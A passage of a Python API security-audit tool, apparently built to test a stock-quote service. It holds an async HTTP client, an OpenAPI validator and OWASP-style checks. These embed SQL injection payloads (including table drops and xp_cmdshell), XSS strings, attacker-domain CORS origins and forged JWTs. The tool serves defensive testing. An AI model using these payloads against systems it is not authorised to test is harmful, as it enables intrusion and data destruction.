        headers = kwargs.pop('headers', {}).copy()
        headers.setdefault('User-Agent', f'TFB-APITest/{SCRIPT_VERSION}')
        headers.setdefault('Accept', 'application/json')
        headers.setdefault('X-Request-ID', request_id)
        
        # Add auth token if available
        token = kwargs.pop('token', None) or os.getenv('APP_TOKEN')
        if token:
            headers.setdefault('X-APP-TOKEN', token)
            headers.setdefault('Authorization', f'Bearer {token}')
        
        # Handle params
        params = kwargs.pop('params', {})
        if isinstance(params, list):
            params = dict(params)
        
        # Handle JSON
        json_data = kwargs.pop('json', None)
        data = kwargs.pop('data', None)
        
        # Handle timeout override
        timeout = kwargs.pop('timeout', self.timeout)
        
        start_time = time.perf_counter()
        error = None
        status = 0
        response_data = None
        response_headers = {}
        
        # Track request
        task = asyncio.current_task()
        if task:
            self._active_requests[request_id] = task
        
        try:
            for attempt in range(self.max_retries):
                try:
                    async with self.session.request(
                        method, url,
                        params=params,
                        json=json_data,
                        data=data,
                        headers=headers,
                        timeout=timeout,
                        allow_redirects=self.follow_redirects,
                        ssl=self.verify_ssl,
                        **kwargs
                    ) as resp:
                        status = resp.status
                        response_headers = dict(resp.headers)
                        
                        # Read content
                        content = await resp.read()
                        content_type = resp.headers.get('Content-Type', '').lower()
                        
                        # Parse based on content type
                        if 'application/json' in content_type:
                            try:
                                response_data = json.loads(content)
                            except:
                                response_data = content.decode('utf-8', errors='replace')
                        elif 'text/' in content_type:
                            response_data = content.decode('utf-8', errors='replace')
                        else:
                            response_data = content
                        
                        response_time = time.perf_counter() - start_time
                        
                        # Record metrics
                        async with self._lock:
                            self.metrics[circuit_key].append(response_time)
                            if len(self.metrics[circuit_key]) > 1000:
                                self.metrics[circuit_key] = self.metrics[circuit_key][-1000:]
                        
                        # Update circuit breaker on success
                        if status < 500:
                            async with self._lock:
                                if circuit_key in self.circuit_breakers:
                                    cb = self.circuit_breakers[circuit_key]
                                    if cb['state'] == 'half-open':
                                        cb['successes'] = cb.get('successes', 0) + 1
                                        if cb['successes'] >= 5:
                                            cb['state'] = 'closed'
                                            cb['failures'] = 0
                                            cb['successes'] = 0
                                    elif cb['state'] == 'closed':
                                        cb['failures'] = 0
                        
                        return status, response_data, response_time, response_headers, request_id
                        
                except asyncio.TimeoutError:
                    error = "Timeout"
                    status = 408
                except aiohttp.ClientConnectionError as e:
                    error = f"Connection error: {e}"
                    status = 503
                except aiohttp.ClientResponseError as e:
                    error = str(e)
                    status = e.status
                except Exception as e:
                    error = str(e)
                    status = 500
                
                response_time = time.perf_counter() - start_time
                
                # Update circuit breaker on failure
                async with self._lock:
                    if circuit_key not in self.circuit_breakers:
                        self.circuit_breakers[circuit_key] = {
                            'state': 'closed',
                            'failures': 0,
                            'successes': 0,
                            'reset_at': datetime.now()
                        }
                    
                    cb = self.circuit_breakers[circuit_key]
                    cb['failures'] += 1
                    
                    if cb['failures'] >= 5:  # Threshold
                        cb['state'] = 'open'
                        cb['reset_at'] = datetime.now() + timedelta(seconds=30)
                    
                    self.error_counts[circuit_key] += 1
                
                if attempt < self.max_retries - 1:
                    wait = 2 ** attempt + random.uniform(0, 1)
                    await asyncio.sleep(wait)
                    continue
        
        finally:
            # Remove from active requests
            self._active_requests.pop(request_id, None)
        
        return status, error, response_time, response_headers, request_id
    
    async def get(self, path: str, **kwargs) -> Tuple[int, Any, float, Dict[str, Any], str]:
        """GET request"""
        return await self.request('GET', path, **kwargs)
    
    async def post(self, path: str, **kwargs) -> Tuple[int, Any, float, Dict[str, Any], str]:
        """POST request"""
        return await self.request('POST', path, **kwargs)
    
    async def put(self, path: str, **kwargs) -> Tuple[int, Any, float, Dict[str, Any], str]:
        """PUT request"""
        return await self.request('PUT', path, **kwargs)
    
    async def delete(self, path: str, **kwargs) -> Tuple[int, Any, float, Dict[str, Any], str]:
        """DELETE request"""
        return await self.request('DELETE', path, **kwargs)
    
    async def patch(self, path: str, **kwargs) -> Tuple[int, Any, float, Dict[str, Any], str]:
        """PATCH request"""
        return await self.request('PATCH', path, **kwargs)
    
    async def head(self, path: str, **kwargs) -> Tuple[int, Any, float, Dict[str, Any], str]:
        """HEAD request"""
        return await self.request('HEAD', path, **kwargs)
    
    async def options(self, path: str, **kwargs) -> Tuple[int, Any, float, Dict[str, Any], str]:
        """OPTIONS request"""
        return await self.request('OPTIONS', path, **kwargs)
    
    def get_metrics(self) -> Dict[str, PerformanceMetrics]:
        """Get performance metrics for all endpoints"""
        metrics = {}
        
        for key, times in self.metrics.items():
            if not times:
                continue
            
            method, path = key.split(':', 1)
            times_array = np.array(times) if NUMPY_AVAILABLE else times
            
            # Calculate error rate
            error_count = self.error_counts.get(key, 0)
            total_requests = len(times) + error_count
            error_rate = error_count / total_requests if total_requests > 0 else 0
            
            metrics[key] = PerformanceMetrics(
                endpoint=path,
                method=method,
                samples=len(times),
                min_time=min(times),
                max_time=max(times),
                avg_time=np.mean(times_array) if NUMPY_AVAILABLE else sum(times) / len(times),
                median_time=np.median(times_array) if NUMPY_AVAILABLE else sorted(times)[len(times)//2],
                p95_time=np.percentile(times_array, 95) if NUMPY_AVAILABLE else 0,
                p99_time=np.percentile(times_array, 99) if NUMPY_AVAILABLE else 0,
                p999_time=np.percentile(times_array, 99.9) if NUMPY_AVAILABLE else 0,
                std_dev=np.std(times_array) if NUMPY_AVAILABLE else 0,
                error_rate=error_rate,
                throughput=len(times) / (max(times) - min(times)) if len(times) > 1 else 0
            )
        
        return metrics
    
    async def cancel_all_requests(self):
        """Cancel all active requests"""
        for request_id, task in self._active_requests.items():
            task.cancel()
        self._active_requests.clear()

# =============================================================================
# Schema Validator
# =============================================================================
class SchemaValidator:
    """OpenAPI/Swagger schema validator"""
    
    def __init__(self, spec_path: Optional[str] = None, strict: bool = False):
        self.spec_path = spec_path
        self.spec: Optional[Dict[str, Any]] = None
        self.validator = None
        self.strict = strict
        self.paths_cache: Dict[str, Dict[str, Any]] = {}
        self.schemas: Dict[str, Dict[str, Any]] = {}
        
        if spec_path and PRANCE_AVAILABLE:
            self._load_spec()
    
    def _load_spec(self) -> None:
        """Load OpenAPI specification"""
        try:
            parser = ResolvingParser(self.spec_path, strict=self.strict, backend='openapi-spec-validator')
            self.spec = parser.specification
            
            # Extract schemas
            components = self.spec.get('components', {})
            self.schemas = components.get('schemas', {})
            
            logger.info(f"Loaded OpenAPI spec: {self.spec.get('info', {}).get('title', 'Unknown')} "
                       f"v{self.spec.get('info', {}).get('version', 'Unknown')}")
            
        except Exception as e:
            logger.error(f"Failed to load OpenAPI spec: {e}")
            if self.strict:
                raise
    
    def validate_response(self, path: str, method: str, 
                         status_code: int, response_data: Any) -> List[str]:
        """Validate response against OpenAPI schema"""
        errors = []
        
        if not self.spec or not PRANCE_AVAILABLE:
            return errors
        
        try:
            # Find path in spec
            path_item = self._find_path_item(path)
            if not path_item:
                if self.strict:
                    errors.append(f"Path not found in spec: {path}")
                return errors
            
            # Find operation
            operation = path_item.get(method.lower())
            if not operation:
                if self.strict:
                    errors.append(f"Method {method} not found for path {path}")
                return errors
            
            # Find response schema
            responses = operation.get('responses', {})
            response_spec = responses.get(str(status_code), {})
            
            # Check content types
            content = response_spec.get('content', {})
            if not content and status_code == 204:
                # No content expected
                if response_data not in (None, '', b''):
                    errors.append(f"Expected no content for 204, got {type(response_data)}")
                return errors
            
            # Try JSON schema
            json_schema = content.get('application/json', {}).get('schema')
            if json_schema and JSONSCHEMA_AVAILABLE:
                # Resolve references
                resolved_schema = self._resolve_refs(json_schema)
                try:
                    validate(instance=response_data, schema=resolved_schema)
                except ValidationError as e:
                    errors.append(f"Schema validation failed: {e.message}")
                    
                    # Try to find best match for better error message
                    if hasattr(e, 'path') and e.path:
                        errors.append(f"  at {'/'.join(str(p) for p in e.path)}")
            
            # Validate required fields
            if isinstance(response_data, dict) and 'required' in json_schema:
                required = json_schema.get('required', [])
                missing = [f for f in required if f not in response_data]
                if missing:
                    errors.append(f"Missing required fields: {', '.join(missing)}")
            
            # Validate enum values
            if isinstance(response_data, (str, int, float)):
                self._validate_enum(response_data, json_schema, errors)
            
        except Exception as e:
            errors.append(f"Validation error: {e}")
        
        return errors
    
    def _validate_enum(self, value: Any, schema: Dict, errors: List[str]):
        """Validate enum values"""
        if 'enum' in schema and value not in schema['enum']:
            errors.append(f"Value {value} not in enum: {schema['enum']}")
    
    def _resolve_refs(self, schema: Dict) -> Dict:
        """Resolve $ref references in schema"""
        if not self.spec:
            return schema
        
        if '$ref' in schema:
            ref = schema['$ref']
            if ref.startswith('#/components/schemas/'):
                schema_name = ref.replace('#/components/schemas/', '')
                if schema_name in self.schemas:
                    return self._resolve_refs(self.schemas[schema_name])
        
        # Recursively resolve
        resolved = {}
        for key, value in schema.items():
            if isinstance(value, dict):
                resolved[key] = self._resolve_refs(value)
            elif isinstance(value, list):
                resolved[key] = [self._resolve_refs(item) if isinstance(item, dict) else item 
                                for item in value]
            else:
                resolved[key] = value
        
        return resolved
    
    def _find_path_item(self, path: str) -> Optional[Dict[str, Any]]:
        """Find path item in spec (handles path parameters)"""
        if not self.spec:
            return None
        
        paths = self.spec.get('paths', {})
        
        # Check cache
        if path in self.paths_cache:
            return self.paths_cache[path]
        
        # Exact match
        if path in paths:
            self.paths_cache[path] = paths[path]
            return paths[path]
        
        # Template match
        for template, item in paths.items():
            if self._path_matches(template, path):
                # Extract path parameters
                params = self._extract_path_params(template, path)
                self.paths_cache[path] = {
                    'item': item,
                    'params': params
                }
                return item
        
        return None
    
    def _path_matches(self, template: str, path: str) -> bool:
        """Check if path matches template with parameters"""
        template_parts = template.split('/')
        path_parts = path.split('/')
        
        if len(template_parts) != len(path_parts):
            return False
        
        for t, p in zip(template_parts, path_parts):
            if t.startswith('{') and t.endswith('}'):
                continue  # Parameter, matches anything
            if t != p:
                return False
        
        return True
    
    def _extract_path_params(self, template: str, path: str) -> Dict[str, str]:
        """Extract path parameters from matched path"""
        template_parts = template.split('/')
        path_parts = path.split('/')
        
        params = {}
        for t, p in zip(template_parts, path_parts):
            if t.startswith('{') and t.endswith('}'):
                param_name = t[1:-1]
                params[param_name] = p
        
        return params

# =============================================================================
# Security Auditor
# =============================================================================
class SecurityAuditor:
    """Advanced security auditing with OWASP Top 10 coverage"""
    
    def __init__(self, base_url: str, auth_token: Optional[str] = None):
        self.base_url = base_url
        self.auth_token = auth_token
        self.vulnerabilities: List[SecurityVulnerability] = []
        self.findings: List[ComplianceFinding] = []
    
    async def audit_headers(self, client: AsyncHTTPClient) -> List[SecurityVulnerability]:
        """Audit security headers (OWASP A05:2021)"""
        vulns = []
        
        status, headers, _, response_headers, _ = await client.get('/')
        
        if status == 200 and isinstance(headers, dict):
            # Required security headers
            security_headers = {
                'Strict-Transport-Security': {
                    'required': True,
                    'severity': TestSeverity.MEDIUM,
                    'description': 'Missing HSTS header',
                    'remediation': 'Add Strict-Transport-Security header with max-age>=31536000',
                    'check': lambda v: 'max-age=' in v and int(v.split('max-age=')[1].split(';')[0]) >= 31536000
                },
                'Content-Security-Policy': {
                    'required': True,
                    'severity': TestSeverity.HIGH,
                    'description': 'Missing CSP header',
                    'remediation': 'Implement Content-Security-Policy to prevent XSS',
                    'check': lambda v: len(v) > 20
                },
                'X-Content-Type-Options': {
                    'required': True,
                    'severity': TestSeverity.MEDIUM,
                    'description': 'Missing X-Content-Type-Options: nosniff',
                    'remediation': 'Add X-Content-Type-Options: nosniff header',
                    'check': lambda v: v.lower() == 'nosniff'
                },
                'X-Frame-Options': {
                    'required': True,
                    'severity': TestSeverity.MEDIUM,
                    'description': 'Missing X-Frame-Options',
                    'remediation': 'Add X-Frame-Options: DENY or SAMEORIGIN',
                    'check': lambda v: v.upper() in {'DENY', 'SAMEORIGIN'}
                },
                'X-XSS-Protection': {
                    'required': True,
                    'severity': TestSeverity.LOW,
                    'description': 'Missing X-XSS-Protection',
                    'remediation': 'Add X-XSS-Protection: 1; mode=block',
                    'check': lambda v: '1' in v
                },
                'Referrer-Policy': {
                    'required': True,
                    'severity': TestSeverity.LOW,
                    'description': 'Missing Referrer-Policy',
                    'remediation': 'Add Referrer-Policy: strict-origin-when-cross-origin',
                    'check': lambda v: 'strict' in v.lower()
                },
                'Permissions-Policy': {
                    'required': True,
                    'severity': TestSeverity.LOW,
                    'description': 'Missing Permissions-Policy',
                    'remediation': 'Implement Permissions-Policy header',
                    'check': lambda v: True
                },
                'Cache-Control': {
                    'required': False,
                    'severity': TestSeverity.INFO,
                    'description': 'Missing Cache-Control for sensitive endpoints',
                    'remediation': 'Add Cache-Control: no-store for sensitive data',
                    'check': lambda v: 'no-store' in v
                }
            }
            
            for header, info in security_headers.items():
                value = response_headers.get(header)
                if not value:
                    if info['required']:
                        vulns.append(SecurityVulnerability(
                            type=VulnerabilityType.SECURITY_MISCONFIGURATION,
                            severity=info['severity'],
                            endpoint='/',
                            description=info['description'],
                            remediation=info['remediation'],
                            owasp_category=VulnerabilityType.SECURITY_MISCONFIGURATION
                        ))
                elif not info['check'](value):
                    vulns.append(SecurityVulnerability(
                        type=VulnerabilityType.SECURITY_MISCONFIGURATION,
                        severity=TestSeverity.LOW,
                        endpoint='/',
                        description=f"Weak {header} configuration: {value}",
                        remediation=info['remediation'],
                        evidence={'value': value},
                        owasp_category=VulnerabilityType.SECURITY_MISCONFIGURATION
                    ))
        
        return vulns
    
    async def audit_authentication(self, client: AsyncHTTPClient) -> List[SecurityVulnerability]:
        """Audit authentication mechanisms (OWASP A07:2021)"""
        vulns = []
        
        # Test without authentication
        status, data, _, _, _ = await client.get('/v1/enriched/quote', params={'symbol': 'AAPL'})
        
        if status == 200:
            vulns.append(SecurityVulnerability(
                type=VulnerabilityType.IDENTIFICATION_FAILURES,
                severity=TestSeverity.CRITICAL,
                endpoint='/v1/enriched/quote',
                description='Endpoint accessible without authentication',
                remediation='Require authentication for all protected endpoints',
                owasp_category=VulnerabilityType.IDENTIFICATION_FAILURES
            ))
        
        # Test with invalid token
        bad_headers = {
            'X-APP-TOKEN': 'invalid_token_123',
            'Authorization': 'Bearer invalid_token_123'
        }
        
        status, data, _, _, _ = await client.get(
            '/v1/enriched/quote', 
            params={'symbol': 'AAPL'},
            headers=bad_headers
        )
        
        if status not in [401, 403]:
            vulns.append(SecurityVulnerability(
                type=VulnerabilityType.IDENTIFICATION_FAILURES,
                severity=TestSeverity.HIGH,
                endpoint='/v1/enriched/quote',
                description=f'Invalid token accepted (HTTP {status})',
                remediation='Reject requests with invalid tokens with 401/403',
                evidence={'status': status},
                owasp_category=VulnerabilityType.IDENTIFICATION_FAILURES
            ))
        
        # Test token leakage in URLs
        if self.auth_token:
            url_with_token = f"/v1/enriched/quote?token={self.auth_token}"
            status, data, _, response_headers, _ = await client.get(url_with_token)
            
            # Check if token appears in response
            if isinstance(data, str) and self.auth_token in data:
                vulns.append(SecurityVulnerability(
                    type=VulnerabilityType.EXCESSIVE_DATA_EXPOSURE,
                    severity=TestSeverity.HIGH,
                    endpoint='/v1/enriched/quote',
                    description='Authentication token leaked in response body',
                    remediation='Never include tokens in response bodies',
                    evidence={'token_masked': self.auth_token[:4] + '...'},
                    owasp_category=VulnerabilityType.EXCESSIVE_DATA_EXPOSURE
                ))
        
        # Test token in browser history/logs
        if 'token' in url_with_token:
            vulns.append(SecurityVulnerability(
                type=VulnerabilityType.SECURITY_MISCONFIGURATION,
                severity=TestSeverity.MEDIUM,
                endpoint='/v1/enriched/quote',
                description='Token passed in URL query parameter (visible in browser history/logs)',
                remediation='Use Authorization header instead of URL parameters',
                owasp_category=VulnerabilityType.SECURITY_MISCONFIGURATION
            ))
        
        # Test session fixation
        # Make request with session cookie
        status, data, _, response_headers, _ = await client.get('/')
        set_cookie = response_headers.get('Set-Cookie', '')
        
        if set_cookie and 'session' in set_cookie.lower():
            # Extract session ID
            session_match = re.search(r'session[=:]([^;,\s]+)', set_cookie, re.I)
            if session_match:
                session_id = session_match.group(1)
                
                # Try to reuse session ID
                cookie_headers = {'Cookie': f'session={session_id}'}
                status2, data2, _, _, _ = await client.get('/', headers=cookie_headers)
                
                if status2 == 200 and 'set-cookie' not in response_headers:
                    # Session was reused without regeneration
                    vulns.append(SecurityVulnerability(
                        type=VulnerabilityType.IDENTIFICATION_FAILURES,
                        severity=TestSeverity.MEDIUM,
                        endpoint='/',
                        description='Session ID not regenerated after login (session fixation)',
                        remediation='Regenerate session ID after authentication',
                        evidence={'session_id_masked': session_id[:4] + '...'},
                        owasp_category=VulnerabilityType.IDENTIFICATION_FAILURES
                    ))
        
        return vulns
    
    async def audit_authorization(self, client: AsyncHTTPClient) -> List[SecurityVulnerability]:
        """Audit authorization controls (OWASP A01:2021)"""
        vulns = []
        
        # Test horizontal privilege escalation
        # Try to access another user's data by ID manipulation
        test_ids = [1, 2, 3, 999999, 1000000, 'admin', 'user1', 'other']
        
        for test_id in test_ids:
            status, data, _, _, _ = await client.get(f"/v1/users/{test_id}")
            
            if status == 200 and isinstance(data, dict):
                # Check if we got data for a different user
                if data.get('id') != test_id and data.get('username'):
                    vulns.append(SecurityVulnerability(
                        type=VulnerabilityType.BROKEN_ACCESS_CONTROL,
                        severity=TestSeverity.CRITICAL,
                        endpoint=f"/v1/users/{test_id}",
                        description=f'Horizontal privilege escalation - accessed user {data.get("id")}',
                        remediation='Implement proper authorization checks for all user IDs',
                        evidence={'accessed_id': test_id, 'returned_id': data.get('id')},
                        owasp_category=VulnerabilityType.BROKEN_ACCESS_CONTROL
                    ))
                    break
        
        # Test vertical privilege escalation
        # Try to access admin endpoints without admin privileges
        admin_endpoints = ['/admin', '/v1/admin/users', '/internal/health', '/debug/pprof']
        
        for endpoint in admin_endpoints:
            status, data, _, _, _ = await client.get(endpoint)
            
            if status == 200:
                vulns.append(SecurityVulnerability(
                    type=VulnerabilityType.BROKEN_ACCESS_CONTROL,
                    severity=TestSeverity.CRITICAL,
                    endpoint=endpoint,
                    description=f'Admin endpoint accessible without privileges',
                    remediation='Implement role-based access control (RBAC)',
                    owasp_category=VulnerabilityType.BROKEN_ACCESS_CONTROL
                ))
        
        # Test IDOR (Insecure Direct Object References)
        # Try to access objects by incrementing IDs
        for i in range(1, 5):
            status, data, _, _, _ = await client.get(f"/v1/orders/{i}")
            if status == 200 and data:
                # Found order, try to access next
                status2, data2, _, _, _ = await client.get(f"/v1/orders/{i+1}")
                if status2 == 200 and data2:
                    # Check if orders belong to different users
                    if data.get('user_id') != data2.get('user_id'):
                        vulns.append(SecurityVulnerability(
                            type=VulnerabilityType.BROKEN_ACCESS_CONTROL,
                            severity=TestSeverity.HIGH,
                            endpoint=f"/v1/orders/{i+1}",
                            description='IDOR - accessed order belonging to different user',
                            remediation='Verify user ownership before returning data',
                            evidence={'order1_user': data.get('user_id'), 'order2_user': data2.get('user_id')},
                            owasp_category=VulnerabilityType.BROKEN_ACCESS_CONTROL
                        ))
                        break
        
        return vulns
    
    async def audit_rate_limiting(self, client: AsyncHTTPClient) -> List[SecurityVulnerability]:
        """Audit rate limiting implementation (OWASP API4:2019)"""
        vulns = []
        
        # Make rapid requests
        start = time.time()
        responses = []
        statuses = []
        
        for i in range(100):
            status, _, _, headers, _ = await client.get('/v1/enriched/quote', params={'symbol': 'AAPL'})
            responses.append(status)
            statuses.append(status)
            
            if i % 10 == 0:
                await asyncio.sleep(0.01)
        
        duration = time.time() - start
        rate = len(responses) / duration
        
        # Check for rate limit headers
        rate_limit_headers = ['X-RateLimit-Limit', 'X-RateLimit-Remaining', 
                              'X-RateLimit-Reset', 'Retry-After']
        has_rate_headers = any(h in headers for h in rate_limit_headers)
        
        if not has_rate_headers and rate > 10:
            vulns.append(SecurityVulnerability(
                type=VulnerabilityType.RATE_LIMITING_FAILURE,
                severity=TestSeverity.MEDIUM,
                endpoint='/v1/enriched/quote',
                description=f'No rate limiting detected ({rate:.1f} req/s possible)',
                remediation='Implement rate limiting with proper headers',
                evidence={'rate': rate},
                owasp_category=VulnerabilityType.RATE_LIMITING_FAILURE
            ))
        
        # Check for 429 responses
        if 429 not in responses:
            vulns.append(SecurityVulnerability(
                type=VulnerabilityType.RATE_LIMITING_FAILURE,
                severity=TestSeverity.LOW,
                endpoint='/v1/enriched/quote',
                description='No 429 Too Many Requests responses seen',
                remediation='Return 429 when rate limit exceeded',
                owasp_category=VulnerabilityType.RATE_LIMITING_FAILURE
            ))
        
        # Check for consistent rate limiting
        if len(set(responses)) == 1 and responses[0] == 200:
            # All requests succeeded, check response time degradation
            if duration > 5 and rate > 50:
                vulns.append(SecurityVulnerability(
                    type=VulnerabilityType.RATE_LIMITING_FAILURE,
                    severity=TestSeverity.MEDIUM,
                    endpoint='/v1/enriched/quote',
                    description='Service may be vulnerable to DoS - no throttling detected',
                    remediation='Implement rate limiting to prevent DoS attacks',
                    evidence={'requests': len(responses), 'duration': duration},
                    owasp_category=VulnerabilityType.RATE_LIMITING_FAILURE
                ))
        
        return vulns
    
    async def audit_sql_injection(self, client: AsyncHTTPClient) -> List[SecurityVulnerability]:
        """Test for SQL injection vulnerabilities (OWASP A03:2021)"""
        vulns = []
        
        payloads = [
            ("' OR '1'='1", "Basic tautology"),
            ("'; DROP TABLE users; --", "Drop table"),
            ("' UNION SELECT * FROM users--", "Union attack"),
            ("1' AND 1=1--", "True condition"),
            ("1' AND 1=2--", "False condition"),
            ("' OR '1'='1'--", "Comment injection"),
            ("' OR '1'='1'#", "MySQL comment"),
            ("admin'--", "Admin bypass"),
            ("' WAITFOR DELAY '0:0:5'--", "Time-based (MSSQL)"),
            ("' OR SLEEP(5)--", "Time-based (MySQL)"),
            ("' AND pg_sleep(5)--", "Time-based (PostgreSQL)"),
            ("'; exec xp_cmdshell('dir')--", "Command execution"),
            ("' UNION SELECT @@version--", "Version disclosure"),
            ("' AND 1=CONVERT(int, @@version)--", "Error-based"),
            ("' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'--", "Hash injection"),
        ]
        
        for payload, description in payloads:
            start_time = time.time()
            status, data, duration, headers, _ = await client.get(
                '/v1/enriched/quote',
                params={'symbol': payload}
            )
            
            # Check for time-based injection
            if 'sleep' in payload.lower() and duration > 4:
                vulns.append(SecurityVulnerability(
                    type=VulnerabilityType.INJECTION,
                    severity=TestSeverity.CRITICAL,
                    endpoint='/v1/enriched/quote',
                    description=f'Time-based SQL injection possible: {description}',
                    remediation='Use parameterized queries and prepared statements',
                    evidence={'payload': payload, 'delay': duration},
                    owasp_category=VulnerabilityType.INJECTION
                ))
                break
            
            # Check for error messages
            if isinstance(data, str):
                error_indicators = [
                    'sql', 'mysql', 'postgresql', 'oracle', 'sqlite',
                    'unclosed quotation mark', 'syntax error',
                    'mysql_fetch', 'ORA-', 'SQLite', 'psycopg2',
                    'DatabaseError', 'ProgrammingError', 'OperationalError',
                    'driver', 'db2', 'mssql', 'sybase', 'informix'
                ]
                
                data_lower = data.lower()
                matches = [ind for ind in error_indicators if ind in data_lower]
                
                if matches:
                    vulns.append(SecurityVulnerability(
                        type=VulnerabilityType.INJECTION,
                        severity=TestSeverity.CRITICAL,
                        endpoint='/v1/enriched/quote',
                        description=f'SQL injection vulnerability detected: {description}',
                        remediation='Use parameterized queries and prepared statements',
                        evidence={'payload': payload, 'error_indicators': matches},
                        owasp_category=VulnerabilityType.INJECTION
                    ))
                    break
        
        return vulns
    
    async def audit_xss(self, client: AsyncHTTPClient) -> List[SecurityVulnerability]:
        """Test for XSS vulnerabilities (OWASP A03:2021)"""
        vulns = []
        
        payloads = [
            ('<script>alert(1)</script>', 'Basic script'),
            ('<img src=x onerror=alert(1)>', 'Image onerror'),
            ('javascript:alert(1)', 'JavaScript URI'),
            ('"><script>alert(1)</script>', 'Tag breaking'),
            ('\';alert(1)//', 'JS injection'),
            ('{{constructor.constructor("alert(1)")()}}', 'AngularJS'),
            ('${alert(1)}', 'Jinja2'),
            ('{{alert(1)}}', 'Handlebars'),
            ('<svg onload=alert(1)>', 'SVG'),
            ('<body onload=alert(1)>', 'Body onload'),
            ('<iframe src="javascript:alert(1)">', 'Iframe'),
            ('<math><mtext></mtext><mglyph><malignmark></mglyph></math>', 'MathML'),
            ('<link rel="import" onload="alert(1)">', 'Link import'),
            ('<object data="javascript:alert(1)">', 'Object'),
            ('<embed src="javascript:alert(1)">', 'Embed'),
            ('<a href="javascript:alert(1)">click</a>', 'Anchor'),
            ('<div onmouseover="alert(1)">hover</div>', 'Event handler'),
            ('<input onfocus="alert(1)" autofocus>', 'Input focus'),
            ('<textarea onfocus="alert(1)" autofocus>', 'Textarea focus'),
        ]
        
        for payload, description in payloads:
            status, data, _, headers, _ = await client.get(
                '/v1/enriched/quote',
                params={'symbol': payload}
            )
            
            if isinstance(data, str):
                # Check if payload is reflected unencoded
                if payload in data:
                    vulns.append(SecurityVulnerability(
                        type=VulnerabilityType.INJECTION,
                        severity=TestSeverity.HIGH,
                        endpoint='/v1/enriched/quote',
                        description=f'XSS vulnerability detected: {description}',
                        remediation='Sanitize all user inputs with context-aware encoding',
                        evidence={'payload': payload, 'reflected': True},
                        owasp_category=VulnerabilityType.INJECTION
                    ))
                    break
                
                # Check for partial reflection
                if '<script>' in payload and '<script>' in data:
                    vulns.append(SecurityVulnerability(
                        type=VulnerabilityType.INJECTION,
                        severity=TestSeverity.HIGH,
                        endpoint='/v1/enriched/quote',
                        description=f'Partial XSS reflection: script tags preserved',
                        remediation='Use HTML entity encoding',
                        evidence={'payload': payload},
                        owasp_category=VulnerabilityType.INJECTION
                    ))
                    break
        
        return vulns
    
    async def audit_cors(self, client: AsyncHTTPClient) -> List[SecurityVulnerability]:
        """Audit CORS configuration (OWASP API7:2019)"""
        vulns = []
        
        # Test with different origins
        test_origins = [
            ('https://evil.com', 'Evil domain'),
            ('null', 'Null origin'),
            ('*', 'Wildcard'),
            ('https://attacker.net', 'Attacker domain'),
            ('http://localhost:3000', 'Localhost'),
            ('file://', 'File protocol'),
            ('chrome-extension://', 'Extension'),
            ('https://subdomain.evil.com', 'Subdomain'),
            ('https://evil.com:8443', 'Different port'),
            ('https://evil.com.evildomain.com', 'Domain confusion'),
        ]
        
        for origin, description in test_origins:
            status, _, _, headers, _ = await client.get(
                '/v1/enriched/quote',
                headers={'Origin': origin}
            )
            
            acao = headers.get('Access-Control-Allow-Origin', '')
            acac = headers.get('Access-Control-Allow-Credentials', '').lower()
            acam = headers.get('Access-Control-Allow-Methods', '')
            acah = headers.get('Access-Control-Allow-Headers', '')
            acma = headers.get('Access-Control-Max-Age', '')
            aceh = headers.get('Access-Control-Expose-Headers', '')
            
            if acao == '*' and acac == 'true':
                vulns.append(SecurityVulnerability(
                    type=VulnerabilityType.SECURITY_MISCONFIGURATION,
                    severity=TestSeverity.HIGH,
                    endpoint='/v1/enriched/quote',
                    description=f'CORS allows credentials with wildcard origin',
                    remediation='Do not use wildcard origin with credentials',
                    evidence={'origin': origin, 'acao': acao, 'acac': acac},
                    owasp_category=VulnerabilityType.SECURITY_MISCONFIGURATION
                ))
            elif acao == origin and acac == 'true':
                vulns.append(SecurityVulnerability(
                    type=VulnerabilityType.SECURITY_MISCONFIGURATION,
                    severity=TestSeverity.MEDIUM,
                    endpoint='/v1/enriched/quote',
                    description=f'CORS trusts potentially untrusted origin: {origin}',
                    remediation='Restrict CORS to trusted origins only',
                    evidence={'origin': origin, 'acao': acao},
                    owasp_category=VulnerabilityType.SECURITY_MISCONFIGURATION
                ))
            elif acao and acao != origin and acao != '*':
                # Dynamic origin reflection
                vulns.append(SecurityVulnerability(
                    type=VulnerabilityType.SECURITY_MISCONFIGURATION,
                    severity=TestSeverity.LOW,
                    endpoint='/v1/enriched/quote',
                    description=f'CORS reflects origin without validation',
                    remediation='Validate origin against whitelist before reflecting',
                    evidence={'origin': origin, 'acao': acao},
                    owasp_category=VulnerabilityType.SECURITY_MISCONFIGURATION
                ))
        
        # Test preflight requests
        status, _, _, headers, _ = await client.options(
            '/v1/enriched/quote',
            headers={
                'Origin': 'https://example.com',
                'Access-Control-Request-Method': 'POST',
                'Access-Control-Request-Headers': 'X-Custom-Header'
            }
        )
        
        if status not in [200, 204]:
            vulns.append(SecurityVulnerability(
                type=VulnerabilityType.SECURITY_MISCONFIGURATION,
                severity=TestSeverity.LOW,
                endpoint='/v1/enriched/quote',
                description='CORS preflight request failed',
                remediation='Implement proper CORS preflight handling',
                evidence={'status': status},
                owasp_category=VulnerabilityType.SECURITY_MISCONFIGURATION
            ))
        
        return vulns
    
    async def audit_jwt(self, client: AsyncHTTPClient) -> List[SecurityVulnerability]:
        """Audit JWT implementation (OWASP A02:2021, A07:2021)"""
        vulns = []
        
        if not JWT_AVAILABLE:
            return vulns
        
        # Test JWT algorithm confusion
        test_tokens = [
            # None algorithm
            (jwt.encode({'sub': 'test', 'exp': time.time() + 3600}, '', algorithm='none'), 
             'None algorithm'),
            # Weak secret
            (jwt.encode({'sub': 'test', 'exp': time.time() + 3600}, 'secret', algorithm='HS256'),
             'Weak secret'),
            # Empty secret
            (jwt.encode({'sub': 'test', 'exp': time.time() + 3600}, '', algorithm='HS256'),
             'Empty secret'),
            # Algorithm switching (HS256 signed, but expecting RS256)
            (jwt.encode({'sub': 'test', 'exp': time.time() + 3600}, 'secret', algorithm='HS256'),
             'Algorithm confusion'),
            # No expiration
            (jwt.encode({'sub': 'test'}, 'secret', algorithm='HS256'),
             'No expiration'),
            # Long expiration
            (jwt.encode({'sub': 'test', 'exp': time.time() + 31536000}, 'secret', algorithm='HS256'),
             'Long expiration (1 year)'),
            # Header injection
